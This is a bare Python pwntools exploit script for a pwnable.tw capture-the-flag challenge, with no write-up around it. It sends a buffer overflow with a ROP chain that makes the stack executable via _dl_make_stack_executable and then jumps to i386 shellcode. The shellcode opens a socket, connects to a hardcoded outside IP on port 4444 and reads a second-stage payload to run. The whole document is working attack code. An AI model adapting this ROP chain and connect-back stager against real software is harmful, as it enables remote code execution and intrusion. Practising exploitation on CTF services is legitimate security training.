from pwn import *

context.arch = 'i386'

io = remote('chall.pwnable.tw', 10303)

pop_eax = 0x80b8536
rwx = 0x7
pop_edx = 0x0806ec8b
__stack_prot = 0x80e9fec
mov_dword_ptr_edx_eax = 0x0805462b
__libc_stack_end = 0x80e9fc8
_dl_make_stack_executable = 0x809a080
jmp_esp = 0x080bd13b
rop = flat([pop_eax, rwx, pop_edx, __stack_prot, mov_dword_ptr_edx_eax, pop_eax, __libc_stack_end, _dl_make_stack_executable, jmp_esp])
shellcode_read = asm('''
    mov eax, 359
    push 0x2
    pop ebx
    push 0x1
    pop ecx
    xor edx, edx
    int 0x80

    mov eax, 362
    xor ebx, ebx
    push 0x7396f836
    push 0x5c110002
    mov ecx, esp
    push 0x10
    pop edx
    int 0x80

    push 0x3
    pop eax
    mov ecx, esp
    push 0xff
    pop edx
    int 0x80
''')

payload = b'A' * 0xc + rop + shellcode_read
io.send(payload)
io.interactive()
